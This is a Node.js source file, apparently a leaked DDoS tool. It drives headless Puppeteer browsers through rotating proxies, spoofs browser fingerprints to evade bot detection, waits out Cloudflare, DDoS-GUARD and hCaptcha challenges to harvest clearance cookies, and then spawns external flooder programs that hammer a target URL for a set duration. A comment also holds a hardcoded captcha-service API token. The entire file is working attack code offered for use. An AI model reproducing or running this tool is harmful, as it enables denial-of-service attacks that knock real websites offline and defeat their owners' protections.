const fs = require('fs'),
	puppeteer = require('puppeteer'),
	url = require('url'),
	solveCaptcha = require('hcaptcha-solver'),
	colors = require('colors');
/*	RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha'),
	StealthPlugin = require('puppeteer-extra-plugin-stealth'); */
const {
  spawn
} = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
if (process.argv.length < 9) {
  console.log(colors.rainbow('[NODE.JS - LEAKED]'), colors.red('mode url proxy duration threads ratelimit captcha=true/false [optional: Strings]'));
  process.exit(0);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}


async function getmain() {
  const mode = process.argv[2];
  let target_url = process.argv[3],
    target = target_url.split('""')[0];
  const proxyFile = process.argv[4];
  const timeforattack = process.argv[5];
  const browsernum = process.argv[6];
  const reqperip = process.argv[7];
  const captcha = process.argv[8];
  const rand_query = process.argv[9];
  const
    useragents = fs.readFileSync("ua.txt", 'utf-8').toString().split('\n'),
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0),
    isattackstart = new Map();
  var session = [];

  function useragent() {
    return useragents[Math.floor(Math.random() * useragents.length)]
  }

  function randomProxies() {
    const whois = proxies[Math.floor(Math.random() * proxies.length)];
    proxies.remove(whois)
    return whois;
  }

  
  let domain = url.parse(target_url).hostname;
  Array.prototype.remove = function() {
    var what, a = arguments,
      L = a.length,
      ax;
    while (L && this.length) {
      what = a[--L];
      while ((ax = this.indexOf(what)) !== -1) {
        this.splice(ax, 1);
      }
    }
    return this;
  };
  async function addsession() {
    try {
      let random_ua = useragent();
      const randed = randomProxies();
      solving({
        "url": target,
        "host": domain,
        "proxy": randed,
        'user_agent': random_ua,
        'reqperip': reqperip,
        'mode': mode,
		'captcha': captcha
      }).then((cookie, ua) => {
        let myString = "";
        let laa_ = JSON.stringify(cookie);
        laa_ = JSON.parse(laa_);
        laa_.forEach((value) => {
          const valueString = value.name + "=" + value.value + ";";
          myString += valueString;
        });
        session.push({
          "myString": myString,
          "reqperip": reqperip,
          "randed": randed,
          'user_agent': random_ua,
          'mode': mode,
		  'captcha': captcha
        })
       // console.log('[NODE.JS - LEAKED] User-Agent: ' + random_ua + ' ');
        console.log('[NODE.JS - LEAKED] Cookie: ' + myString + ' ');
		start(mode, target, domain, timeforattack, browsernum, random_ua, myString, reqperip, randed, rand_query);
      }).catch((ee) => {
        try {
			addsession();
        } catch (e) {}
      })
    } catch (e) {}
  }
	
	console.log(colors.rainbow('[NODE.JS - LEAKED]'), colors.red('Creating browser: [' + browsernum + ']'));
 
    for (let i = 0; i < browsernum; i++) {
        setTimeout(() => {
            addsession();
        },(200 * Math.floor(Math.random() * 20)))
    }   
}
getmain();

function solving(message) {
  return new Promise((resolve, reject) => {
 /*   puppeteer.use(StealthPlugin())
        puppeteer.use(RecaptchaPlugin({
            provider: {
                id:'2captcha',
                token:'4aff009cb99eb3c5172df153f148f8f4'
            },
            visualFeedback:true
        }))	  */
    puppeteer.launch({
      headless: true,
	  defaultViewport: null,
      ignoreHTTPSErrors: true,
      ignoreDefaultArgs: [
        "--disable-extensions",
        "--enable-automation"
      ],
      args: [
        `--proxy-server=http://${message.proxy}`,
        '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
        '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
        "--window-position=000,000",
        "--disable-dev-shm-usage",
        '--user-agent=' + message.user_agent,
		'--no-sandbox',
		'--disable-setuid-sandbox',
		'--disable-infobars',
		'--no-zygote',
		'--window-position=0,0',
		'--ignore-certificate-errors',
		'--ignore-certificate-errors-skip-list',
		'--disable-accelerated-2d-canvas',
		'--disable-gpu',
		'--hide-scrollbars',
		'--disable-notifications',
		'--disable-background-timer-throttling',
		'--disable-backgrounding-occluded-windows',
		'--disable-breakpad',
		'--disable-component-extensions-with-background-pages',
		'--disable-extensions',
		'--disable-features=TranslateUI,BlinkGenPropertyTrees',
		'--disable-ipc-flooding-protection',
		'--disable-renderer-backgrounding',
		'--enable-features=NetworkService,NetworkServiceInProcess',
		'--force-color-profile=srgb',
		'--metrics-recording-only',
		'--mute-audio',
		'--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
		'--disable-blink-features',
		'--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
		'--disable-blink-features=AutomationControlled',
		'--use-gl=desktop',
		'--use-gl=egl',
		'--window-size=1920x1080',
		'--enable-automation',
		'--no-startup-window',
		'--enable-monitor-profile',
		'--no-remote',
		'--wait-for-browser',
		'--foreground',
		'--juggler-pipe',
		'--silent',
      ]
    }).then(async(browser) => {
	const page = await browser.newPage();
	await page.setDefaultNavigationTimeout(60000);
            await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => false,
            });
        });
			await page.evaluateOnNewDocument(() => {
			Object.defineProperty(navigator, 'platform', {
				get: () => 'Win32',
			});
		});
			await page.evaluateOnNewDocument(() => {
			  const originalQuery = window.navigator.permissions.query;
			  window.detailChrome = 'unknown';
			  return window.navigator.permissions.query = (parameters) => (
				parameters.name === 'notifications' ?
				  Promise.resolve({ state: Notification.permission }) :
				  originalQuery(parameters)
			  );
			});	
/*await page.evaluateOnNewDocument(() => {
  Object.defineProperty(navigator, 'plugins', {
    get: () => [
        {
            0: {type: "__application/x-google-chrome-pdf~pdf~", suffixes: "pdf", description: "Portable Document Format"},
            description: "Portable Document Format",
            filename: "rVq1aNGDBAgwYsWLFiRo0aNGjRo069eP",
            length: 1,
            name: "Browser PDF and PS Display"
        },
    ],
  });
});*/
        await page.evaluateOnNewDocument(() => {
          Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
        });			
      try {	
		await page.goto(message.url);
		await page.waitForTimeout(10000);
		
		const hcaptcha = await page.$('#h-captcha');
		const cfcaptcha = await page.$('#cf-hcaptcha-container');
		try {
			if(hcaptcha || cfcaptcha && captcha == "true") {
			//	await page.solveRecaptchas();
				await page.waitForTimeout(7500);
			}
		} catch (errorcaptcha) {
			await browser.close();
			reject(errorcaptcha);
		}
	
		await page.goto(message.url);
		await page.waitForTimeout(5500);
	
		const title = await page.title();
		try {
		if(title == "Just a moment..." || title == "DDOS-GUARD" || title == "Access denied" || title == "Lütfen Bekleyiniz..." || title == "Service Unavailable | Baloo.one" || title == "Cloudflare is checking your browser..." || title == "Access denied | graph.vshield.pro used Cloudflare to restrict access") {
				browser.close();
		}
		} catch (errtitle) {
			await browser.close();
			reject(errtitle);
		}		
		
		const titles = await page.title();
        const cookies = await page.cookies();
        if (cookies) {
		  console.log('[NODE.JS - LEAKED]', colors.red('Title:'), colors.rainbow(titles));
          resolve(cookies);
          await browser.close();
          return;
        }
      } catch (ee) {
        reject(ee)
        await browser.close();
      };
    })
  })
}

function start(mode, target, domain, timeforattack, browsernum, random_ua, myString, reqperip, randed, rand_query) {
  let promise = new Promise((res, rej) => {
    //const ls = spawn('./stress', ["mode=" + mode, "url=" + target, "domain=" + domain, "limit=1", "time=" + timeforattack, "good=" + randed, "threads=" + reqperip, "cookie=" + myString, "user_agent=" + random_ua, "rand_query=" + rand_query]);
	const ls = spawn('./stress1', [target, random_ua, timeforattack, myString, mode, reqperip, randed]);
//	const ls = spawn('node', ["flooder.js", mode, target, randed, timeforattack, reqperip, "1", random_ua, "cookie=" + myString]);
	//console.log(ls);
    ls.stdout.on('data', (data) => {
		//console.log(data);
      return res();
    });
  })
}